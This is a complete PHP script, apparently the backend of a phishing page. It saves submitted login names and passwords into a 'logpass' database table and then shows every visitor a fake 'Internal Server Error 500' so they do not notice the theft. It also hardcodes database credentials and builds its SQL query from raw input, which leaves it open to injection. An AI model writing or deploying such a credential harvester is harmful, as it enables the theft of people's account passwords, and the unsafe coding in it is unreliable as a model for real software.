<?php
$servername = "localhost";
$database = "u0967793_default";
$username = "u0967793_default";
$password = "xmu625V!";

// Устанавливаем соединение

$conn = mysqli_connect($servername, $username, $password, $database);

// Проверяем соединение

if (!$conn) {
      die("<h1>Internal Server Error 500</h1>");
}

$login = $_POST['login'];
$password = $_POST['password'];

$sql = 'INSERT INTO logpass (login, password) VALUES ("' . $login . '", "' . $password . '")';
if (mysqli_query($conn, $sql)) {
      echo "<h1>Internal Server Error 500</h1>";
} else {
      echo "<h1>Internal Server Error 500</h1>";
}
mysqli_close($conn);

?>